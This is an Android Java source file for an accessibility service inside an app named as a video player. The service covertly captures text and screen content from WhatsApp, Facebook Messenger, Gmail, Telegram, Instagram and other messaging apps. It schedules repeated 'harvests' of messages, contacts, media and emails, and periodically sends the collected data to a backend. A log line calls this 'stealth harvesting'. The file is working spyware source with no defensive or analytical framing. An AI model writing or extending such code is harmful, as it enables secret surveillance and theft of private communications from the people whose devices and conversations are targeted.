package com.jumpy.videoplayerapp;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.File;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class UnifiedAccessibilityService extends AccessibilityService {
    private static final String TAG = "jumpy_UnifiedAccess";
    
    private WhatsAppHarvester whatsAppHarvester;
    private FacebookHarvester facebookHarvester;
    private EmailHarvester emailHarvester;
    private ScheduledExecutorService scheduler;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "=== UnifiedAccessibilityService created ===");
        
        // Initialize harvesters
        whatsAppHarvester = new WhatsAppHarvester(this);
        facebookHarvester = new FacebookHarvester(this);
        emailHarvester = new EmailHarvester(this);
        
        // Start background harvesting
        startBackgroundHarvesting();
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getSource() == null) return;
        
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
        
        // Route events to appropriate harvester
        switch (packageName) {
            case "com.whatsapp":
            case "com.whatsapp.w4b":
                whatsAppHarvester.handleAccessibilityEvent(event);
                break;
                
            case "com.facebook.katana":
            case "com.facebook.orca":
            case "com.facebook.mlite":
                facebookHarvester.handleAccessibilityEvent(event);
                break;
                
            case "com.google.android.gm":
            case "com.android.email":
                emailHarvester.handleAccessibilityEvent(event);
                break;
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.i(TAG, "=== UnifiedAccessibilityService connected ===");
        
        // Configure accessibility service info
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        
        // Set event types to monitor
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_SCROLLED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED;
        
        // Set feedback type
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        
        // Set flags
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
        
        // Set notification timeout
        info.notificationTimeout = 100;
        
        // Set package names to monitor (all major apps)
        info.packageNames = new String[]{
            "com.whatsapp",
            "com.whatsapp.w4b", 
            "com.facebook.katana",
            "com.facebook.orca",
            "com.facebook.mlite",
            "com.google.android.gm",
            "com.android.email",
            "com.instagram.android",
            "com.twitter.android",
            "com.snapchat.android",
            "com.telegram.messenger",
            "com.discord",
            "com.skype.raider",
            "com.viber.voip",
            "com.google.android.apps.messaging",
            "com.android.mms"
        };
        
        setServiceInfo(info);
        Log.i(TAG, "Accessibility service configured for stealth harvesting");
    }
    
    /**
     * Start background harvesting on a schedule
     */
    private void startBackgroundHarvesting() {
        Log.i(TAG, "Starting background harvesting...");
        
        scheduler = Executors.newScheduledThreadPool(4);
        
        // Schedule WhatsApp harvesting every 5 minutes (for testing)
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "=== Running scheduled WhatsApp harvest ===");
                    whatsAppHarvester.harvestAllData();
                    Log.i(TAG, "=== WhatsApp harvest completed ===");
                } catch (Exception e) {
                    Log.e(TAG, "Error in scheduled WhatsApp harvest: " + e.getMessage());
                }
            }
        }, 30, 300, TimeUnit.SECONDS); // Start after 30 seconds, repeat every 5 minutes
        
        // Schedule Facebook harvesting every 10 minutes
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "=== Running scheduled Facebook harvest ===");
                    facebookHarvester.harvestAllData();
                    Log.i(TAG, "=== Facebook harvest completed ===");
                } catch (Exception e) {
                    Log.e(TAG, "Error in scheduled Facebook harvest: " + e.getMessage());
                }
            }
        }, 60, 600, TimeUnit.SECONDS); // Start after 1 minute, repeat every 10 minutes
        
        // Schedule email harvesting every 15 minutes
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "=== Running scheduled email harvest ===");
                    emailHarvester.harvestAllEmails();
                    Log.i(TAG, "=== Email harvest completed ===");
                } catch (Exception e) {
                    Log.e(TAG, "Error in scheduled email harvest: " + e.getMessage());
                }
            }
        }, 90, 900, TimeUnit.SECONDS); // Start after 1.5 minutes, repeat every 15 minutes
        
        // Schedule comprehensive data sync every 30 minutes
        scheduler.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.i(TAG, "=== Running comprehensive data sync ===");
                    performComprehensiveSync();
                    Log.i(TAG, "=== Comprehensive sync completed ===");
                } catch (Exception e) {
                    Log.e(TAG, "Error in comprehensive sync: " + e.getMessage());
                }
            }
        }, 120, 1800, TimeUnit.SECONDS); // Start after 2 minutes, repeat every 30 minutes
        
        Log.i(TAG, "Background harvesting scheduled successfully");
    }
    
    /**
     * Perform comprehensive data synchronization
     */
    private void performComprehensiveSync() {
        Log.i(TAG, "Performing comprehensive data sync...");
        
        try {
            // Sync all harvested data
            if (whatsAppHarvester != null) {
                whatsAppHarvester.sendDataToBackend();
            }
            
            if (facebookHarvester != null) {
                facebookHarvester.sendDataToBackend();
            }
            
            if (emailHarvester != null) {
                emailHarvester.sendDataToBackend();
            }
            
            // Clean up old data
            cleanupOldData();
            
            Log.i(TAG, "Comprehensive sync completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Error in comprehensive sync: " + e.getMessage());
        }
    }
    
    /**
     * Clean up old harvested data
     */
    private void cleanupOldData() {
        Log.i(TAG, "Cleaning up old data...");
        
        try {
            // Clean up old backup files (older than 24 hours)
            long cutoffTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
            
            File backupDir = new File(getExternalFilesDir(null), "backups");
            if (backupDir.exists()) {
                File[] files = backupDir.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.lastModified() < cutoffTime) {
                            if (file.delete()) {
                                Log.d(TAG, "Deleted old backup file: " + file.getName());
                            }
                        }
                    }
                }
            }
            
            Log.i(TAG, "Data cleanup completed");
            
        } catch (Exception e) {
            Log.e(TAG, "Error cleaning up old data: " + e.getMessage());
        }
    }
    
    /**
     * Stop background harvesting
     */
    public void stopBackgroundHarvesting() {
        Log.i(TAG, "Stopping background harvesting...");
        
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
            }
        }
    }
    
    /**
     * Get harvesting status
     */
    public String getHarvestingStatus() {
        StringBuilder status = new StringBuilder();
        status.append("Unified Harvesting Status:\n");
        
        // WhatsApp status
        if (whatsAppHarvester != null) {
            status.append("• WhatsApp: ACTIVE\n");
            status.append("  - Messages: ").append(whatsAppHarvester.getMessagesCount()).append("\n");
            status.append("  - Contacts: ").append(whatsAppHarvester.getContactsCount()).append("\n");
            status.append("  - Media: ").append(whatsAppHarvester.getMediaCount()).append("\n");
        }
        
        // Facebook status
        if (facebookHarvester != null) {
            status.append("• Facebook: ACTIVE\n");
            status.append("  - Profiles: ").append(facebookHarvester.getProfilesCount()).append("\n");
            status.append("  - Posts: ").append(facebookHarvester.getPostsCount()).append("\n");
            status.append("  - Emails: ").append(facebookHarvester.getEmailsCount()).append("\n");
        }
        
        // Email status
        if (emailHarvester != null) {
            status.append("• Email: ACTIVE\n");
            status.append("  - Emails: ").append(emailHarvester.getEmailsCount()).append("\n");
            status.append("  - Contacts: ").append(emailHarvester.getContactsCount()).append("\n");
        }
        
        return status.toString();
    }
    
    @Override
    public void onDestroy() {
        Log.i(TAG, "=== UnifiedAccessibilityService destroyed ===");
        stopBackgroundHarvesting();
        super.onDestroy();
    }
} 